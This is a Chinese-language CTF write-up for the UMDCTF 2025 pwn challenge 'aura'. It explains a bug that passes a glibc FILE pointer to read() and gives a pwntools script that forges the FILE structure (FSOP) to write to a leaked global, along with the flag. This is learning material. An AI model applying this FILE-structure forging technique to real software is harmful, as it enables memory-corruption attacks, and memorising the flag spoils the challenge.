# UMDCTF 2025 - aura

## 题目简述

程序打印全局变量 `aura` 的地址，随后打开 `/dev/null` 得到一个 `FILE` 对象。
漏洞在于它把 `FILE *` 当作普通缓冲区交给 `read`：

```c
FILE *fp = fopen("/dev/null", "r");
read(0, fp, 0x100);
fread(buf, 1, 8, fp);
```

只要在后续 `fread` 中让 `aura` 变为非零，程序就会读取并输出 `flag.txt`。
题目的决定性原语是伪造 glibc 的 `FILE` 结构，因此归入 `pwn`。

## 解题过程

程序已经泄漏 `&aura`，所以不需要绕过 PIE 去寻找写入目标。`read(0, fp, 0x100)`
允许覆盖 `fopen` 创建的真实 `_IO_FILE` 对象；随后程序仍会把这块内存传给
`fread`。这构成了一次直接的 FSOP（File Stream Oriented Programming）机会。

Pwntools 的 `FileStructure.read(addr, size)` 可以生成一个用于“从标准输入向指定地址
读数据”的伪造文件结构。官方解题脚本的核心逻辑是：

```python
from pwn import *

context.arch = "amd64"
p = remote("challs.umdctf.io", 31006)

p.recvuntil(b": ")
aura = int(p.recvline().strip(), 16)

fake_fp = FileStructure()
payload = fake_fp.read(aura, 0x10)
p.send(payload)
p.send(b"0" * 16)
```

伪造结构把底层文件描述符和读指针状态调整为可继续从标准输入取数，并把目标缓冲区
设为泄漏出的 `aura` 地址。程序调用 `fread(buf, 1, 8, fp)` 时，glibc 实际把第二段
输入写进 `aura`；发送任意非零字节后，`if (aura)` 条件成立，最终得到：

```text
UMDCTF{+100aur4}
```

仓库中的 `README.md` 还保留着旧占位 flag `umdctf{bzBAbsMQ}`，但实际容器复制的是
同目录的 `flag.txt`，源码也从运行目录读取该文件，因此这里以
`UMDCTF{+100aur4}` 为准。

## 方法总结

本题的关键不是直接覆盖 `aura`，而是先破坏仍会被使用的 `FILE` 对象，再借
`fread` 完成受控写入。分析类似题目时，应重点检查 `FILE *` 是否被错误地交给
`read`、`memcpy` 等裸内存接口，以及后续标准 I/O 调用能否把伪造的缓冲区边界、
文件描述符和状态位转化为任意读写。题目同时提醒我们，仓库文档、源码和运行时文件
发生冲突时，应以实际部署路径及被读取的文件为准。
